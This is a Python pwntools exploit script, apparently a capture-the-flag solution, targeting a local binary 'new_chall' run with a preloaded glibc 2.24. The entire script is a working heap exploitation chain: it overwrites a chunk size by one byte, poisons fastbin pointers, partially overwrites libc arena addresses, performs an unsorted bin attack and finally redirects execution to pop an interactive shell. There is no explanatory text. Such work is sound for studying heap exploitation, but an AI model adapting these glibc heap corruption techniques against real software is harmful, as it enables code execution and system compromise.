#!/usr/bin/python
from pwn import *

p = process("./new_chall",env={"LD_PRELOAD":"./libc-2.24.so"})
#raw_input()

def menu():
	p.recvuntil("3. Free")

def create(size,idx):
	menu()
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(size))
	p.recvuntil(":")
	p.sendline(str(idx))

def free(idx):
	menu()
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,data):
	menu()
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)


name = "A"*20
p.recvuntil(":")
p.sendline(name)

create(24,0)
create(200,1)
fake = "A"*104
fake += p64(0x61)
edit(1,fake)

create(101,2)

free(1)
create(200,1)

over = "A"*24
over += "\x71"
edit(0,over)

create(101,3)
create(101,15)
create(101,16)
create(101,17)
create(101,18)
create(101,19)
free(2)
free(3)

heap_po = "\x20"
edit(3,heap_po)

arena_po = "\xcd\x4a"
edit(1,arena_po)
#raw_input()
create(101,0)
create(101,0)
create(101,0)
#p.interactive()

# Control arena through 0.
# Now unsorted bin attack.

# First fix 0x71 freelist.
free(15)
edit(15,p64(0x00))

# Fixed.
# 0x7f702619777b

create(200,1)
create(200,1)
create(24,2)
create(200,3)
create(200,4)

free(1)
po = "B"*8
po += "\xe0\x4a"
edit(1,po)

create(200,1)
#5b394f
over = "R"*19
over += "\x4f\x39\x5b"
edit(0,over)

create(200,7)
try:
	resp = p.recv(4, timeout=6)
	p.interactive()
except:
	p.close()
